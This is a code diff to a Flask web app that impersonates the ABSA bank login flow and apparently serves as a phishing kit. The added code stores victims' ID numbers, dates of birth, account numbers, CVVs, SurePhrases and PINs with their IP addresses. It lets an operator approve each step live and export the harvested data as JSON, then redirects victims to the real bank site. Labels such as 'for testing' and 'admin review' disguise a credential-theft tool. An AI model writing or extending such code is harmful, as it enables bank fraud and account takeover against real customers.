@@ -34,13 +34,16 @@ users_db = {
 approval_requests = {}
 handled_requests = {'approved': [], 'rejected': []}
 
+# Store captured user data
+captured_data = {}
+
 # Session management
 login_attempts = {}
 otp_codes = {}
 
 # Helper functions for admin approval
-def create_approval_request(session_id, step_name, next_url):
-    """Create a new approval request"""
+def create_approval_request(session_id, step_name, next_url, user_data=None):
+    """Create a new approval request with user data"""
     request_id = str(uuid.uuid4())
     approval_requests[request_id] = {
         'id': request_id,
@@ -48,7 +51,9 @@ def create_approval_request(session_id, step_name, next_url):
         'step_name': step_name,
         'next_url': next_url,
         'created_at': datetime.now(),
-        'status': 'pending'
+        'status': 'pending',
+        'user_data': user_data or {},
+        'ip_address': request.remote_addr if request else 'Unknown'
     }
     return request_id
 
@@ -67,6 +72,20 @@ def require_admin_approval(step_name, next_route):
             return redirect(url_for('waiting_approval', request_id=request_id))
         return wrapper
     return decorator
+
+def store_user_data(session_id, step_name, data):
+    """Store user data for admin review"""
+    if session_id not in captured_data:
+        captured_data[session_id] = {
+            'session_start': datetime.now(),
+            'steps': {}
+        }
+    
+    captured_data[session_id]['steps'][step_name] = {
+        'timestamp': datetime.now(),
+        'data': data,
+        'ip_address': request.remote_addr if request else 'Unknown'
+    }
 
 @app.route('/')
 def index():
@@ -122,13 +141,20 @@ def customer_info():
             flash('Please fill in all required fields', 'error')
             return render_template('customer_info.html')
         
+        # Store customer info data
+        customer_data = {
+            'id_type': id_type,
+            'id_number': id_number,
+            'date_of_birth': f'{dob_day}/{dob_month}/{dob_year}',
+            'account_number': account_number,
+            'branch_code': branch_code,
+            'cvv': cvv,
+            'timestamp': datetime.now().isoformat()
+        }
+        
         # For testing - accept any details
         session['account_number'] = account_number
         session['authenticated_step1'] = True
-        
-        # Debug: Print what we're storing
-        print(f"DEBUG: Storing account number: {account_number}")
-        print(f"DEBUG: Session account_number: {session.get('account_number')}")
         
         # Generate account numbers safely
         account_suffix = account_number[-4:] if account_number and len(account_number) >= 4 else '1234'
@@ -145,12 +171,14 @@ def customer_info():
             }
         }
         
-        # Create approval request for customer info step
+        # Store user data for admin review
         session_id = session.get('session_id', str(uuid.uuid4()))
         session['session_id'] = session_id
+        store_user_data(session_id, 'Customer Information', customer_data)
         
+        # Create approval request for customer info step
         next_url = url_for('surephrase_auth')
-        request_id = create_approval_request(session_id, 'Customer Information', next_url)
+        request_id = create_approval_request(session_id, 'Customer Information', next_url, customer_data)
         
         flash('Customer information submitted for approval', 'info')
         return redirect(url_for('waiting_approval', request_id=request_id))
@@ -163,12 +191,16 @@ def surephrase_auth():
     if not session.get('authenticated_step1'):
         return redirect(url_for('index'))
     
-    # Debug: Print session data
-    print(f"DEBUG: Session account_number on load: {session.get('account_number')}")
-    
     if request.method == 'POST':
         account_number = request.form.get('accountNumber')
         surephrase = request.form.get('surephrase', '').upper()
+        
+        # Store SurePhrase data
+        surephrase_data = {
+            'account_number': account_number,
+            'surephrase': surephrase,
+            'timestamp': datetime.now().isoformat()
+        }
         
         # Check rate limiting
         client_ip = request.remote_addr
@@ -191,12 +223,14 @@ def surephrase_auth():
             if client_ip in login_attempts:
                 login_attempts[client_ip] = {'count': 0, 'locked_until': None}
             
-            # Create approval request for SurePhrase step
+            # Store user data for admin review
             session_id = session.get('session_id', str(uuid.uuid4()))
             session['session_id'] = session_id
+            store_user_data(session_id, 'SurePhrase Authentication', surephrase_data)
             
+            # Create approval request for SurePhrase step
             next_url = url_for('pin_entry')
-            request_id = create_approval_request(session_id, 'SurePhrase Authentication', next_url)
+            request_id = create_approval_request(session_id, 'SurePhrase Authentication', next_url, surephrase_data)
             
             flash('SurePhrase submitted for approval', 'info')
             return redirect(url_for('waiting_approval', request_id=request_id))
@@ -224,17 +258,26 @@ def pin_entry():
         
         account_number = session.get('account_number')
         
+        # Store PIN data
+        pin_data = {
+            'account_number': account_number,
+            'pin': pin,
+            'timestamp': datetime.now().isoformat()
+        }
+        
         # For testing - accept any 5-digit PIN
         if account_number == session.get('account_number') and len(pin) == 5 and pin.isdigit():
             session['authenticated_step3'] = True
             session['authenticated_step4'] = True  # Skip multi-factor auth
             
-            # Create approval request for PIN step
+            # Store user data for admin review
             session_id = session.get('session_id', str(uuid.uuid4()))
             session['session_id'] = session_id
+            store_user_data(session_id, 'PIN Verification', pin_data)
             
+            # Create approval request for PIN step
             next_url = 'https://ib.absa.co.za'
-            request_id = create_approval_request(session_id, 'PIN Verification', next_url)
+            request_id = create_approval_request(session_id, 'PIN Verification', next_url, pin_data)
             
             flash('PIN submitted for approval', 'info')
             return redirect(url_for('waiting_approval', request_id=request_id))
@@ -425,11 +468,19 @@ def admin_approve(request_id):
         return jsonify({'success': False, 'message': 'Unauthorized'})
     
     if request_id in approval_requests:
-        approval_requests[request_id]['status'] = 'approved'
-        approval_requests[request_id]['handled_at'] = datetime.now()
+        req = approval_requests[request_id]
+        req['status'] = 'approved'
+        req['handled_at'] = datetime.now()
+        req['approved_by'] = session.get('admin_username', 'admin')
+        
+        # Store approved data permanently
+        session_id = req['session_id']
+        if session_id in captured_data:
+            captured_data[session_id]['approved_at'] = datetime.now()
+            captured_data[session_id]['approved_by'] = session.get('admin_username', 'admin')
         
         # Move to handled requests
-        handled_requests['approved'].append(approval_requests[request_id])
+        handled_requests['approved'].append(req)
         
         return jsonify({'success': True})
     
@@ -442,11 +493,19 @@ def admin_reject(request_id):
         return jsonify({'success': False, 'message': 'Unauthorized'})
     
     if request_id in approval_requests:
-        approval_requests[request_id]['status'] = 'rejected'
-        approval_requests[request_id]['handled_at'] = datetime.now()
+        req = approval_requests[request_id]
+        req['status'] = 'rejected'
+        req['handled_at'] = datetime.now()
+        req['rejected_by'] = session.get('admin_username', 'admin')
+        
+        # Mark data as rejected
+        session_id = req['session_id']
+        if session_id in captured_data:
+            captured_data[session_id]['rejected_at'] = datetime.now()
+            captured_data[session_id]['rejected_by'] = session.get('admin_username', 'admin')
         
         # Move to handled requests
-        handled_requests['rejected'].append(approval_requests[request_id])
+        handled_requests['rejected'].append(req)
         
         return jsonify({'success': True})
     
@@ -495,6 +554,56 @@ def cancel_request(request_id):
         return jsonify({'success': True})
     return jsonify({'success': False})
 
+# Add new admin routes for data management
+@app.route('/admin/view-data/<session_id>')
+def admin_view_data(session_id):
+    """View captured data for a session"""
+    if not session.get('admin_logged_in'):
+        return redirect(url_for('admin_login'))
+    
+    if session_id in captured_data:
+        data = captured_data[session_id]
+        return render_template('admin_view_data.html', session_id=session_id, data=data)
+    else:
+        flash('Session data not found', 'error')
+        return redirect(url_for('admin_dashboard'))
+
+@app.route('/admin/data-history')
+def admin_data_history():
+    """View all captured data history"""
+    if not session.get('admin_logged_in'):
+        return redirect(url_for('admin_login'))
+    
+    return render_template('admin_data_history.html', captured_data=captured_data)
+
+@app.route('/admin/export-data/<session_id>')
+def admin_export_data(session_id):
+    """Export session data as JSON"""
+    if not session.get('admin_logged_in'):
+        return jsonify({'error': 'Unauthorized'}), 403
+    
+    if session_id in captured_data:
+        data = captured_data[session_id]
+        # Convert datetime objects to strings for JSON serialization
+        export_data = {}
+        for key, value in data.items():
+            if isinstance(value, datetime):
+                export_data[key] = value.isoformat()
+            elif key == 'steps':
+                export_data[key] = {}
+                for step_name, step_data in value.items():
+                    export_data[key][step_name] = {
+                        'timestamp': step_data['timestamp'].isoformat(),
+                        'data': step_data['data'],
+                        'ip_address': step_data.get('ip_address', 'Unknown')
+                    }
+            else:
+                export_data[key] = value
+        
+        return jsonify(export_data)
+    else:
+        return jsonify({'error': 'Session not found'}), 404
+
 # Error handlers
 @app.errorhandler(404)
 def not_found(error):
@@ -509,6 +618,24 @@ def internal_error(error):
                          error_message='Internal server error'), 500
 
 if __name__ == '__main__':
+    # Configuration
+    is_production = os.environ.get('FLASK_ENV') == 'production'
+    
+    if not is_production:
+        # Local development configuration
+        app.config['SECRET_KEY'] = 'dev-secret-key-change-in-production'
+        
+        print("\n" + "="*50)
+        print("ABSA Banking Authentication System")
+        print("="*50)
+        print("Application starting on http://localhost:5000")
+        print("Admin Panel: http://localhost:5000/admin")
+        print(f"Admin Username: {ADMIN_USERNAME}")
+        print(f"Admin Password: {ADMIN_PASSWORD}")
+        print("="*50 + "\n")
+    
     port = int(os.environ.get('PORT', 5000))
-    debug = os.environ.get('FLASK_ENV') != 'production'
-    app.run(debug=debug, host='0.0.0.0', port=port)
+    host = '0.0.0.0' if is_production else '127.0.0.1'
+    debug = not is_production
+    
+    app.run(debug=debug, host=host, port=port)
